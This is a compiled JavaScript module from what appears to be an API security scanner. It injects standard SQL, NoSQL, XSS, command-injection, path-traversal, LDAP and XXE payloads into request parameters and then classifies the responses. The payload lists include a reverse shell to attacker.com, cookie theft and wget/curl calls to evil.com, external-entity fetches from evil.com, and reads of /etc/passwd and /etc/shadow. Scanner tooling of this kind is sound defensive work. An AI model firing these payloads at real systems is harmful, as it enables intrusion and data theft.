"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.ParameterTester = void 0;
const axios_1 = __importDefault(require("axios"));
const logger_1 = require("../utils/logger");
const RecommendationService_1 = require("../recommendations/RecommendationService");
class ParameterTester {
    constructor(options = { useAI: false, maxPayloads: 50, includeAdvanced: false }) {
        this.options = options;
        this.sqlInjectionPayloads = [
            "\' OR \'1\'=\'1",
            "\' OR 1=1--",
            "\' UNION SELECT NULL--",
            "\'; DROP TABLE users--",
            "\' AND (SELECT SUBSTRING(@@version,1,1))=\'5\'--",
            "\' OR (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "1\' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--",
            "\' OR SLEEP(5)--",
            "\'; WAITFOR DELAY \'00:00:05\'--",
            "\' OR \'x\'=\'x",
            "admin\'--",
            "\' OR 1=1#",
            "\' HAVING 1=1--",
            "\' GROUP BY 1--",
            "\' ORDER BY 1--",
        ];
        this.nosqlInjectionPayloads = [
            { "$ne": null },
            { "$regex": ".*" },
            { "$where": "1==1" },
            { "$gt": "" },
            { "$exists": true },
            { "$in": ["admin", "user"] },
            { "$or": [{ "a": 1 }, { "b": 2 }] },
            { "$and": [{ "a": 1 }, { "b": 2 }] },
            "\'; return db.users.find(); //",
            { "$func": "var_dump" }
        ];
        this.xssPayloads = [
            "<script>alert(\'XSS\')</script>",
            "\'><script>alert(String.fromCharCode(88,83,83))</script>",
            "\\\"><script>alert(\'XSS\')</script>",
            "<img src=x onerror=alert(\'XSS\')>",
            "<svg onload=alert(\'XSS\')>",
            "javascript:alert(\'XSS\')",
            "<iframe src=\'javascript:alert(\\\"XSS\\\")\'></iframe>",
            "<body onload=alert(\'XSS\')>",
            "<input onfocus=alert(\'XSS\') autofocus>",
            "<%2Fscript%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",
            "\';alert(\'XSS\');//",
            "\\\";alert(\'XSS\');//",
            "<script>fetch(\'http://evil.com/\'+document.cookie)</script>"
        ];
        this.commandInjectionPayloads = [
            "; ls -la",
            "| whoami",
            "&& cat /etc/passwd",
            "|| id",
            "`id`",
            "$(whoami)",
            "; cat /etc/hosts",
            "| nc -e /bin/sh attacker.com 4444",
            "&& curl http://evil.com/$(whoami)",
            "; sleep 10",
            "| ping -c 10 127.0.0.1",
            "&& echo \'vulnerable\' > /tmp/test",
            "|| wget http://evil.com/shell.php"
        ];
        this.pathTraversalPayloads = [
            "../../../etc/passwd",
            "..\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252F..%252F..%252Fetc%252Fpasswd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "/var/www/../../etc/passwd",
            "file:///etc/passwd",
            "php://filter/read=convert.base64-encode/resource=../../../etc/passwd"
        ];
        this.ldapInjectionPayloads = [
            "*",
            "*)(",
            "*)(uid=*)(",
            "*)(|(uid=*))",
            "*)(|(password=*))",
            "admin)(&(password=*))",
            "*)(|(&(objectClass=person)(uid=*)))",
            "*)(|(objectClass=*))"
        ];
        this.xxePayloads = [
            '<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM \"file:///etc/passwd\">]><root>&test;</root>\'',
            '<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM \"http://evil.com/evil.dtd\">]><root>&test;</root>\'',
            '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>\'',
            '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY % xxe SYSTEM \"http://evil.com/evil.dtd\"> %xxe;]><foo/>\''
        ];
        this.errorSignatures = {
            sql: [
                'SQL syntax', 'mysql_fetch', 'ORA-', 'PostgreSQL', 'Warning: pg_',
                'valid MySQL result', 'MySqlClient', 'Microsoft OLE DB Provider',
                'Unclosed quotation mark', 'quoted string not properly terminated'
            ],
            nosql: [
                'MongoError', 'CastError', 'ValidationError', 'BSONError',
                'E11000 duplicate key', 'MongoNetworkError'
            ],
            xss: [
                'script', 'alert', 'onerror', 'onload', 'javascript:'
            ],
            command: [
                'sh: ', 'bash: ', 'cmd: ', 'command not found', '/bin/sh',
                'Permission denied', 'No such file or directory'
            ],
            path_traversal: [
                'root:x:', 'daemon:x:', 'bin:x:', '[boot loader]', 'WINDOWS',
                'Program Files', 'Documents and Settings'
            ],
            ldap: [
                'Invalid DN syntax', 'LDAP: error code', 'LdapErr',
                'com.sun.jndi.ldap', 'javax.naming.directory'
            ],
            xxe: [
                'XML parsing error', 'DOCTYPE is not allowed', 'external entity',
                'Undefined entity', 'java.io.FileNotFoundException'
            ]
        };
        this.recommendationService = new RecommendationService_1.RecommendationService();
    }
    async testParameter(endpoint, method, parameter, baselineResponse) {
        logger_1.logger.info(`Testing parameter: ${parameter.name} (${parameter.type}) at ${method} ${endpoint}`);
        const vulnerabilities = [];
        try {
            if (!baselineResponse) {
                baselineResponse = await this.makeBaselineRequest(endpoint, method, parameter);
            }
            const payloads = await this.generatePayloads(parameter);
            for (const payload of payloads) {
                try {
                    const vulnerability = await this.testPayload(endpoint, method, parameter, payload, baselineResponse);
                    if (vulnerability) {
                        vulnerabilities.push(vulnerability);
                    }
                }
                catch (error) {
                    logger_1.logger.warn(`Payload test failed: ${error.message}`);
                }
            }
            if (this.options.useAI && vulnerabilities.length > 0) {
                await this.enhanceVulnerabilityAnalysis(vulnerabilities);
            }
            return vulnerabilities;
        }
        catch (error) {
            logger_1.logger.error(`Parameter testing failed: ${error.message}`);
            return [];
        }
    }
    async generatePayloads(parameter) {
        const payloads = [];
        if (parameter.type === 'string' || parameter.type === 'unknown') {
            this.sqlInjectionPayloads.slice(0, 10).forEach(payload => {
                payloads.push({
                    value: payload,
                    technique: 'error-based',
                    category: 'SQL_INJECTION',
                    description: 'Attempting SQL injection with common error-based payloads.'
                });
            });
            this.nosqlInjectionPayloads.slice(0, 10).forEach(payload => {
                payloads.push({
                    value: payload,
                    technique: 'error-based',
                    category: 'NOSQL_INJECTION',
                    description: 'Attempting NoSQL injection with common error-based payloads.'
                });
            });
            this.xssPayloads.slice(0, 10).forEach(payload => {
                payloads.push({
                    value: payload,
                    technique: 'reflected',
                    category: 'XSS',
                    description: 'Attempting Cross-Site Scripting (XSS) with common reflected payloads.'
                });
            });
            this.commandInjectionPayloads.slice(0, 10).forEach(payload => {
                payloads.push({
                    value: payload,
                    technique: 'in-band',
                    category: 'COMMAND_INJECTION',
                    description: 'Attempting Command Injection with common in-band payloads.'
                });
            });
            this.pathTraversalPayloads.slice(0, 10).forEach(payload => {
                payloads.push({
                    value: payload,
                    technique: 'directory-traversal',
                    category: 'PATH_TRAVERSAL',
                    description: 'Attempting Path Traversal with common payloads.'
                });
            });
            this.ldapInjectionPayloads.slice(0, 10).forEach(payload => {
                payloads.push({
                    value: payload,
                    technique: 'error-based',
                    category: 'LDAP_INJECTION',
                    description: 'Attempting LDAP Injection with common error-based payloads.'
                });
            });
            this.xxePayloads.slice(0, 5).forEach(payload => {
                payloads.push({
                    value: payload,
                    technique: 'in-band',
                    category: 'XXE',
                    description: 'Attempting XML External Entity (XXE) injection.'
                });
            });
        }
        if (this.options.useAI && this.options.includeAdvanced) {
            const aiPayloads = await this.generateAIEnhancedPayloads(parameter);
            payloads.push(...aiPayloads);
        }
        return payloads.slice(0, this.options.maxPayloads);
    }
    async generateAIEnhancedPayloads(parameter) {
        // This is a placeholder for actual AI integration
        logger_1.logger.info(`Generating AI-enhanced payloads for parameter: ${parameter.name}`);
        const aiPayloads = [];
        // Example AI generated payloads (in a real scenario, this would come from an LLM)
        if (parameter.type === 'string' && parameter.location === 'query') {
            if (this.options.targetLanguage === 'sql' || this.options.targetLanguage === 'all') {
                aiPayloads.push({
                    value: `\' UNION SELECT table_name FROM information_schema.tables WHERE table_schema = database()--`,
                    technique: 'union-based',
                    category: 'SQL_INJECTION',
                    description: 'AI-generated payload for union-based SQL injection.'
                });
            }
            if (this.options.targetLanguage === 'command' || this.options.targetLanguage === 'all') {
                aiPayloads.push({
                    value: `$(cat /etc/shadow)`,
                    technique: 'blind-out-of-band',
                    category: 'COMMAND_INJECTION',
                    description: 'AI-generated payload for out-of-band command injection.'
                });
            }
        }
        return aiPayloads;
    }
    async testPayload(endpoint, method, parameter, payload, baselineResponse) {
        const startTime = process.hrtime.bigint();
        let response;
        let opposingResponse;
        try {
            response = await this.makeRequest(endpoint, method, parameter, payload.value);
        }
        catch (error) {
            if (error.code === 'ECONNABORTED' || error.code === 'ETIMEDOUT') {
                logger_1.logger.warn(`Request to ${endpoint} timed out with payload for parameter ${parameter.name}.`);
                return {
                    parameter,
                    vulnerability: {
                        type: types_1.VulnerabilityType.DENIAL_OF_SERVICE,
                        name: 'Potential Denial of Service / Unhandled Exception',
                        description: `The application returned a connection error or timed out when processing payload: ${payload.value}`,
                        severity: types_1.VulnerabilitySeverity.HIGH,
                        confidence: 0.7,
                        cwe: 'CWE-400',
                        owasp: 'A07:2021 – Identification and Authentication Failures' // A placeholder, can be refined
                    },
                    payload: {
                        original: parameter.example || '',
                        malicious: payload.value,
                        technique: payload.technique,
                        category: payload.category
                    },
                    evidence: {
                        request: JSON.stringify({ endpoint, method, parameter: parameter.name, payload: payload.value }),
                        response: `Error: ${error.message}`,
                        statusCode: error.response?.status || 0,
                        responseTime: Number((process.hrtime.bigint() - startTime) / BigInt(1000000)),
                        differenceDetected: true,
                        errorSignatures: [error.message]
                    },
                    impact: 'Service disruption or information disclosure through errors',
                    recommendation: this.recommendationService.generateRecommendation({
                        id: '', scanId: '', type: types_1.VulnerabilityType.DENIAL_OF_SERVICE, severity: types_1.VulnerabilitySeverity.HIGH,
                        endpoint: endpoint, method: method, description: '', impact: '', confidence: 0, evidence: {}, remediation: { priority: 0, effort: 'low', steps: [], automatable: false }, discoveredAt: new Date()
                    })
                };
            }
            throw error; // Re-throw other errors
        }
        const responseTime = Number((process.hrtime.bigint() - startTime) / BigInt(1000000));
        const vulnerability = this.analyzeResponse(parameter, payload, response, baselineResponse, responseTime, opposingResponse);
        if (vulnerability) {
            return {
                parameter,
                vulnerability: vulnerability.vulnerability,
                payload: {
                    original: parameter.example || '',
                    malicious: payload.value,
                    technique: payload.technique,
                    category: payload.category
                },
                evidence: vulnerability.evidence,
                impact: this.getVulnerabilityImpact(vulnerability.vulnerability.type),
                recommendation: this.getVulnerabilityRecommendation(vulnerability.vulnerability.type, vulnerability.vulnerability.severity)
            };
        }
        return null;
    }
    analyzeResponse(parameter, payload, response, baselineResponse, responseTime, opposingResponse) {
        const responseBody = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
        const baselineBody = typeof baselineResponse.data === 'string' ? baselineResponse.data : JSON.stringify(baselineResponse.data);
        const errorSignatures = this.detectErrorSignatures(responseBody, payload.category);
        const contentDiff = this.analyzeContentDifference(responseBody, baselineBody).suspicious;
        const statusCodeDiff = response.status !== baselineResponse.status;
        const sizeDiff = responseBody.length !== baselineBody.length;
        // Time-based injection detection
        const timingAnomaly = responseTime > (baselineResponse.headers['x-response-time'] ? parseFloat(baselineResponse.headers['x-response-time']) * 2 : 1000) && responseTime > 2000; // If response time is significantly higher (e.g., 2x baseline and > 2s)
        if (timingAnomaly) {
            return {
                parameter,
                vulnerability: {
                    type: types_1.VulnerabilityType.SQL_INJECTION_TIME_BASED,
                    name: 'Time-Based Blind SQL Injection',
                    description: `The application\'s response time significantly increased (${responseTime}ms), indicating a potential time-based blind SQL Injection vulnerability.`,
                    severity: types_1.VulnerabilitySeverity.HIGH,
                    confidence: 0.85,
                    cwe: 'CWE-89',
                    owasp: 'A03:2021 – Injection'
                },
                payload: { original: parameter.example || '', malicious: payload.value, technique: payload.technique, category: payload.category },
                evidence: {
                    request: JSON.stringify({ parameter: parameter.name, payload: payload.value }),
                    response: responseBody,
                    statusCode: response.status,
                    responseTime,
                    differenceDetected: true,
                    timeDelayDetected: true
                },
                impact: this.getVulnerabilityImpact(types_1.VulnerabilityType.SQL_INJECTION_TIME_BASED),
                recommendation: this.getVulnerabilityRecommendation(types_1.VulnerabilityType.SQL_INJECTION_TIME_BASED, types_1.VulnerabilitySeverity.HIGH)
            };
        }
        if (errorSignatures.some(sig => this.errorSignatures.sql.includes(sig))) {
            return {
                parameter,
                vulnerability: {
                    type: types_1.VulnerabilityType.SQL_INJECTION_ERROR_BASED,
                    name: 'Error-Based SQL Injection',
                    description: 'SQL error messages were detected in the application\'s response, indicating a potential error-based SQL Injection vulnerability.',
                    severity: types_1.VulnerabilitySeverity.HIGH,
                    confidence: 0.75,
                    cwe: 'CWE-89',
                    owasp: 'A03:2021 – Injection'
                },
                payload: { original: parameter.example || '', malicious: payload.value, technique: payload.technique, category: payload.category },
                evidence: {
                    request: JSON.stringify({ parameter: parameter.name, payload: payload.value }),
                    response: responseBody,
                    statusCode: response.status,
                    responseTime,
                    differenceDetected: true,
                    errorSignatures
                },
                impact: this.getVulnerabilityImpact(types_1.VulnerabilityType.SQL_INJECTION_ERROR_BASED),
                recommendation: this.getVulnerabilityRecommendation(types_1.VulnerabilityType.SQL_INJECTION_ERROR_BASED, types_1.VulnerabilitySeverity.HIGH)
            };
        }
        if (payload.category === 'NOSQL_INJECTION' && errorSignatures.some(sig => this.errorSignatures.nosql.includes(sig))) {
            return {
                parameter,
                vulnerability: {
                    type: types_1.VulnerabilityType.NOSQL_INJECTION,
                    name: 'NoSQL Injection',
                    description: 'NoSQL error messages or unexpected query results were detected in the application\'s response, indicating a potential NoSQL Injection vulnerability.',
                    severity: types_1.VulnerabilitySeverity.HIGH,
                    confidence: 0.8,
                    cwe: 'CWE-943',
                    owasp: 'A03:2021 – Injection'
                },
                payload: { original: parameter.example || '', malicious: payload.value, technique: payload.technique, category: payload.category },
                evidence: {
                    request: JSON.stringify({ parameter: parameter.name, payload: payload.value }),
                    response: responseBody,
                    statusCode: response.status,
                    responseTime,
                    differenceDetected: true,
                    errorSignatures
                },
                impact: this.getVulnerabilityImpact(types_1.VulnerabilityType.NOSQL_INJECTION),
                recommendation: this.getVulnerabilityRecommendation(types_1.VulnerabilityType.NOSQL_INJECTION, types_1.VulnerabilitySeverity.HIGH)
            };
        }
        if (errorSignatures.some(sig => this.errorSignatures.xss.includes(sig)) || (payload.category === 'XSS' && contentDiff)) {
            return {
                parameter,
                vulnerability: {
                    type: types_1.VulnerabilityType.XSS,
                    name: 'Reflected Cross-Site Scripting (XSS)',
                    description: 'The XSS payload was reflected in the response or XSS-related patterns were detected, indicating a potential Reflected XSS vulnerability.',
                    severity: types_1.VulnerabilitySeverity.HIGH,
                    confidence: 0.9,
                    cwe: 'CWE-79',
                    owasp: 'A03:2021 – Injection'
                },
                payload: { original: parameter.example || '', malicious: payload.value, technique: payload.technique, category: payload.category },
                evidence: {
                    request: JSON.stringify({ parameter: parameter.name, payload: payload.value }),
                    response: responseBody,
                    statusCode: response.status,
                    responseTime,
                    differenceDetected: true,
                    errorSignatures
                },
                impact: this.getVulnerabilityImpact(types_1.VulnerabilityType.XSS),
                recommendation: this.getVulnerabilityRecommendation(types_1.VulnerabilityType.XSS, types_1.VulnerabilitySeverity.HIGH)
            };
        }
        if (errorSignatures.some(sig => this.errorSignatures.command.includes(sig)) || (payload.category === 'COMMAND_INJECTION' && contentDiff)) {
            return {
                parameter,
                vulnerability: {
                    type: types_1.VulnerabilityType.COMMAND_INJECTION,
                    name: 'Command Injection',
                    description: 'Command execution output or command-related error messages detected in the response, indicating a potential command injection vulnerability.',
                    severity: types_1.VulnerabilitySeverity.CRITICAL,
                    confidence: 0.95,
                    cwe: 'CWE-77',
                    owasp: 'A03:2021 – Injection'
                },
                payload: { original: parameter.example || '', malicious: payload.value, technique: payload.technique, category: payload.category },
                evidence: {
                    request: JSON.stringify({ parameter: parameter.name, payload: payload.value }),
                    response: responseBody,
                    statusCode: response.status,
                    responseTime,
                    differenceDetected: true,
                    errorSignatures
                },
                impact: this.getVulnerabilityImpact(types_1.VulnerabilityType.COMMAND_INJECTION),
                recommendation: this.getVulnerabilityRecommendation(types_1.VulnerabilityType.COMMAND_INJECTION, types_1.VulnerabilitySeverity.CRITICAL)
            };
        }
        if (errorSignatures.some(sig => this.errorSignatures.path_traversal.includes(sig)) || (payload.category === 'PATH_TRAVERSAL' && contentDiff)) {
            return {
                parameter,
                vulnerability: {
                    type: types_1.VulnerabilityType.PATH_TRAVERSAL,
                    name: 'Path Traversal',
                    description: 'Directory content or system file paths were exposed in the application\'s response, indicating a potential Path Traversal vulnerability.',
                    severity: types_1.VulnerabilitySeverity.MEDIUM,
                    confidence: 0.7,
                    cwe: 'CWE-22',
                    owasp: 'A04:2021 – Insecure Design'
                },
                payload: { original: parameter.example || '', malicious: payload.value, technique: payload.technique, category: payload.category },
                evidence: {
                    request: JSON.stringify({ parameter: parameter.name, payload: payload.value }),
                    response: responseBody,
                    statusCode: response.status,
                    responseTime,
                    differenceDetected: true,
                    errorSignatures
                },
                impact: this.getVulnerabilityImpact(types_1.VulnerabilityType.PATH_TRAVERSAL),
                recommendation: this.getVulnerabilityRecommendation(types_1.VulnerabilityType.PATH_TRAVERSAL, types_1.VulnerabilitySeverity.MEDIUM)
            };
        }
        if (errorSignatures.some(sig => this.errorSignatures.ldap.includes(sig)) || (payload.category === 'LDAP_INJECTION' && contentDiff)) {
            return {
                parameter,
                vulnerability: {
                    type: types_1.VulnerabilityType.LDAP_INJECTION,
                    name: 'LDAP Injection',
                    description: 'LDAP-specific error messages or unexpected directory query results were detected, indicating a potential LDAP Injection vulnerability.',
                    severity: types_1.VulnerabilitySeverity.HIGH,
                    confidence: 0.8,
                    cwe: 'CWE-90',
                    owasp: 'A03:2021 – Injection'
                },
                payload: { original: parameter.example || '', malicious: payload.value, technique: payload.technique, category: payload.category },
                evidence: {
                    request: JSON.stringify({ parameter: parameter.name, payload: payload.value }),
                    response: responseBody,
                    statusCode: response.status,
                    responseTime,
                    differenceDetected: true,
                    errorSignatures
                },
                impact: this.getVulnerabilityImpact(types_1.VulnerabilityType.LDAP_INJECTION),
                recommendation: this.getVulnerabilityRecommendation(types_1.VulnerabilityType.LDAP_INJECTION, types_1.VulnerabilitySeverity.HIGH)
            };
        }
        if (errorSignatures.some(sig => this.errorSignatures.xxe.includes(sig)) || (payload.category === 'XXE' && contentDiff)) {
            return {
                parameter,
                vulnerability: {
                    type: types_1.VulnerabilityType.XXE,
                    name: 'XML External Entity (XXE)',
                    description: 'XML parsing errors or external entity resolution detected, indicating a potential XXE vulnerability.',
                    severity: types_1.VulnerabilitySeverity.CRITICAL,
                    confidence: 0.9,
                    cwe: 'CWE-611',
                    owasp: 'A05:2021 – Security Misconfiguration'
                },
                payload: { original: parameter.example || '', malicious: payload.value, technique: payload.technique, category: payload.category },
                evidence: {
                    request: JSON.stringify({ parameter: parameter.name, payload: payload.value }),
                    response: responseBody,
                    statusCode: response.status,
                    responseTime,
                    differenceDetected: true,
                    errorSignatures
                },
                impact: this.getVulnerabilityImpact(types_1.VulnerabilityType.XXE),
                recommendation: this.getVulnerabilityRecommendation(types_1.VulnerabilityType.XXE, types_1.VulnerabilitySeverity.CRITICAL)
            };
        }
        if (contentDiff || statusCodeDiff || sizeDiff) {
            if (errorSignatures.length > 0) {
                return {
                    parameter,
                    vulnerability: {
                        type: types_1.VulnerabilityType.GENERIC_ERROR_BASED_INJECTION,
                        name: 'Generic Error-Based Injection',
                        description: `Application returned an error indicating a potential injection vulnerability: ${errorSignatures.join(', ')}`,
                        severity: types_1.VulnerabilitySeverity.MEDIUM,
                        confidence: 0.6,
                        cwe: 'CWE-74',
                        owasp: 'A03:2021 – Injection'
                    },
                    payload: { original: parameter.example || '', malicious: payload.value, technique: payload.technique, category: payload.category },
                    evidence: {
                        request: JSON.stringify({ parameter: parameter.name, payload: payload.value }),
                        response: responseBody,
                        statusCode: response.status,
                        responseTime,
                        differenceDetected: true,
                        errorSignatures
                    },
                    impact: this.getVulnerabilityImpact(types_1.VulnerabilityType.GENERIC_ERROR_BASED_INJECTION),
                    recommendation: this.getVulnerabilityRecommendation(types_1.VulnerabilityType.GENERIC_ERROR_BASED_INJECTION, types_1.VulnerabilitySeverity.MEDIUM)
                };
            }
            return {
                parameter,
                vulnerability: {
                    type: types_1.VulnerabilityType.GENERIC_DIFFERENCE_BASED_INJECTION,
                    name: 'Generic Difference-Based Injection',
                    description: 'The application\'s response differed significantly from the baseline, indicating a potential injection vulnerability.',
                    severity: types_1.VulnerabilitySeverity.LOW,
                    confidence: 0.5,
                    cwe: 'CWE-20',
                    owasp: 'A03:2021 – Injection'
                },
                payload: { original: parameter.example || '', malicious: payload.value, technique: payload.technique, category: payload.category },
                evidence: {
                    request: JSON.stringify({ parameter: parameter.name, payload: payload.value }),
                    response: responseBody,
                    statusCode: response.status,
                    responseTime,
                    differenceDetected: true
                },
                impact: this.getVulnerabilityImpact(types_1.VulnerabilityType.GENERIC_DIFFERENCE_BASED_INJECTION),
                recommendation: this.getVulnerabilityRecommendation(types_1.VulnerabilityType.GENERIC_DIFFERENCE_BASED_INJECTION, types_1.VulnerabilitySeverity.LOW)
            };
        }
        return null;
    }
    detectErrorSignatures(responseBody, category) {
        const detectedSignatures = [];
        const lowerBody = responseBody.toLowerCase();
        for (const sig of this.errorSignatures.sql) {
            if (lowerBody.includes(sig.toLowerCase())) {
                detectedSignatures.push(sig);
            }
        }
        for (const sig of this.errorSignatures.nosql) {
            if (lowerBody.includes(sig.toLowerCase())) {
                detectedSignatures.push(sig);
            }
        }
        for (const sig of this.errorSignatures.xss) {
            if (lowerBody.includes(sig.toLowerCase())) {
                detectedSignatures.push(sig);
            }
        }
        for (const sig of this.errorSignatures.command) {
            if (lowerBody.includes(sig.toLowerCase())) {
                detectedSignatures.push(sig);
            }
        }
        for (const sig of this.errorSignatures.path_traversal) {
            if (lowerBody.includes(sig.toLowerCase())) {
                detectedSignatures.push(sig);
            }
        }
        for (const sig of this.errorSignatures.ldap) {
            if (lowerBody.includes(sig.toLowerCase())) {
                detectedSignatures.push(sig);
            }
        }
        for (const sig of this.errorSignatures.xxe) {
            if (lowerBody.includes(sig.toLowerCase())) {
                detectedSignatures.push(sig);
            }
        }
        return detectedSignatures;
    }
    analyzeContentDifference(responseBody, baselineBody) {
        if (!baselineBody || baselineBody.length === 0) {
            return { suspicious: false };
        }
        const responseWords = new Set(responseBody.toLowerCase().split(/\W+/));
        const baselineWords = new Set(baselineBody.toLowerCase().split(/\W+/));
        let commonWords = 0;
        responseWords.forEach(word => {
            if (baselineWords.has(word)) {
                commonWords++;
            }
        });
        const similarityThreshold = 0.7; // 70% similarity
        if (commonWords / Math.max(responseWords.size, baselineWords.size) < similarityThreshold) {
            return { suspicious: true, reason: 'Significant content change' };
        }
        return { suspicious: false };
    }
    classifyVulnerability(payload, errorSignatures, indicators) {
        // This method is largely replaced by logic in analyzeResponse for direct classification
        // based on payload category, error signatures, and response differences.
        // It is kept here as a placeholder if more complex, multi-factor classification is needed later.
        return {
            type: 'UNKNOWN_VULNERABILITY',
            name: 'Unknown Vulnerability',
            description: 'Could not classify vulnerability based on current logic.',
            severity: 'INFO',
            confidence: 0.1,
            cwe: 'N/A',
            owasp: 'N/A'
        };
    }
    getVulnerabilityImpact(type) {
        const impacts = {
            [types_1.VulnerabilityType.SQL_INJECTION_ERROR_BASED]: 'Unauthorized data access, data manipulation, potential system compromise',
            [types_1.VulnerabilityType.SQL_INJECTION_BOOLEAN_BASED]: 'Authentication bypass, data extraction, unauthorized access',
            [types_1.VulnerabilityType.SQL_INJECTION_TIME_BASED]: 'Service disruption, resource exhaustion',
            [types_1.VulnerabilityType.NOSQL_INJECTION]: 'Authentication bypass, data extraction, unauthorized access',
            [types_1.VulnerabilityType.XSS]: 'Session hijacking, credential theft, malicious script execution',
            [types_1.VulnerabilityType.COMMAND_INJECTION]: 'Remote code execution, system compromise, data exfiltration',
            [types_1.VulnerabilityType.PATH_TRAVERSAL]: 'Unauthorized file access, sensitive data exposure',
            [types_1.VulnerabilityType.LDAP_INJECTION]: 'Authentication bypass, data extraction, unauthorized access',
            [types_1.VulnerabilityType.XXE]: 'Arbitrary file read, SSRF, DoS',
            [types_1.VulnerabilityType.DENIAL_OF_SERVICE]: 'Service disruption, resource exhaustion',
            [types_1.VulnerabilityType.GENERIC_ERROR_BASED_INJECTION]: 'Potential security impact requiring investigation',
            [types_1.VulnerabilityType.GENERIC_DIFFERENCE_BASED_INJECTION]: 'Potential security impact requiring investigation',
            [types_1.VulnerabilityType.NO_AUTHENTICATION]: 'Complete bypass of security controls',
            [types_1.VulnerabilityType.WEAK_AUTHENTICATION]: 'Easy bypass of authentication',
            [types_1.VulnerabilityType.BROKEN_ACCESS_CONTROL]: 'Unauthorized access to resources, privilege escalation',
            [types_1.VulnerabilityType.CORS_MISCONFIGURATION]: 'Cross-origin data access',
            [types_1.VulnerabilityType.MISSING_SECURITY_HEADERS]: 'Reduced defense-in-depth',
            [types_1.VulnerabilityType.RATE_LIMITING_BYPASS]: 'Brute-force attacks, resource exhaustion',
            [types_1.VulnerabilityType.INFORMATION_DISCLOSURE]: 'Reconnaissance for further attacks',
            [types_1.VulnerabilityType.FILE_EXPOSURE]: 'Sensitive data exposure',
            [types_1.VulnerabilityType.DIRECTORY_LISTING_ENABLED]: 'Information disclosure, sensitive file discovery',
            [types_1.VulnerabilityType.UNSAFE_HTTP_METHOD_ALLOWED]: 'Unintended actions, data manipulation',
            [types_1.VulnerabilityType.HTTP_METHOD_ALLOWED_WITH_AUTH]: 'Potential for authenticated users to perform unintended actions',
            [types_1.VulnerabilityType.MISSING_HSTS]: 'SSL stripping attacks',
            [types_1.VulnerabilityType.TLS_CERT_HOSTNAME_MISMATCH]: 'Man-in-the-middle attacks',
            [types_1.VulnerabilityType.TLS_CERT_UNTRUSTED]: 'Man-in-the-middle attacks',
            [types_1.VulnerabilityType.CSP_MISSING]: 'XSS and content injection attacks',
            [types_1.VulnerabilityType.CSP_UNSAFE_INLINE]: 'XSS attacks',
            [types_1.VulnerabilityType.CSP_UNSAFE_EVAL]: 'XSS attacks through dynamic code',
            [types_1.VulnerabilityType.CSP_WEAK_DEFAULT_SRC]: 'Reduced XSS protection',
            [types_1.VulnerabilityType.ADMIN_PANEL_EXPOSED]: 'Unauthorized administrative access',
            [types_1.VulnerabilityType.MASS_ASSIGNMENT]: 'Unauthorized data modification',
            [types_1.VulnerabilityType.RACE_CONDITION]: 'Bypass security controls, data corruption',
            [types_1.VulnerabilityType.DEBUG_MODE_ENABLED]: 'Information disclosure, potential remote code execution',
        };
        return impacts[type] || 'Potential security impact requiring investigation';
    }
    getVulnerabilityRecommendation(type, severity) {
        const dummyVulnerability = {
            id: '',
            scanId: '',
            type: type,
            severity: severity,
            endpoint: '',
            method: '',
            description: '',
            impact: '',
            confidence: 0,
            evidence: {},
            remediation: {
                priority: 0,
                effort: 'low',
                steps: [],
                automatable: false
            },
            discoveredAt: new Date()
        };
        return this.recommendationService.generateRecommendation(dummyVulnerability);
    }
    async makeBaselineRequest(endpoint, method, parameter) {
        const value = this.generateSafeValue(parameter);
        return this.makeRequest(endpoint, method, parameter, value);
    }
    async makeRequest(endpoint, method, parameter, value) {
        const url = new URL(endpoint);
        let data = {};
        let params = {};
        let headers = {};
        switch (parameter.location) {
            case 'query':
                params[parameter.name] = value;
                break;
            case 'body':
                data = { [parameter.name]: value };
                headers['Content-Type'] = 'application/json';
                break;
            case 'header':
                headers[parameter.name] = value;
                break;
            case 'path':
                url.pathname = url.pathname.replace(`{${parameter.name}}`, String(value));
                break;
            case 'form':
                data = new URLSearchParams({ [parameter.name]: value }).toString();
                headers['Content-Type'] = 'application/x-www-form-urlencoded';
                break;
        }
        return (0, axios_1.default)({
            method: method.toLowerCase(),
            url: url.toString(),
            data: data,
            params: params,
            headers: {
                'User-Agent': 'CywAyz-API-Scanner/1.0',
                'Accept': 'application/json, text/plain, */*',
                ...headers
            },
            validateStatus: (status) => true, // Resolve all status codes to analyze response
            timeout: 10000 // 10 seconds timeout for requests
        });
    }
    generateSafeValue(parameter) {
        switch (parameter.type) {
            case 'string':
                return 'teststring';
            case 'number':
                return 123;
            case 'boolean':
                return true;
            case 'array':
                return [];
            case 'object':
                return {};
            default:
                return 'safedata';
        }
    }
    async enhanceVulnerabilityAnalysis(vulnerabilities) {
        for (const vuln of vulnerabilities) {
            // Placeholder for AI-driven enhancement
            // In a real scenario, this would involve sending vulnerability details to an LLM
            // for more nuanced analysis, business impact prediction, and enhanced remediation steps.
            logger_1.logger.debug(`AI enhancing analysis for: ${vuln.vulnerability.name}`);
            // Example AI-driven adjustment (simulated)
            if (vuln.vulnerability.type === types_1.VulnerabilityType.SQL_INJECTION && vuln.evidence.responseTime > 3000) {
                vuln.vulnerability.name = 'Time-based Blind SQL Injection (AI Enhanced)';
                vuln.vulnerability.confidence = Math.min(vuln.vulnerability.confidence + 0.05, 1.0);
                vuln.impact = vuln.impact + ' (AI determined high business risk)';
            }
        }
    }
}
exports.ParameterTester = ParameterTester;
//# sourceMappingURL=parameterTester.js.map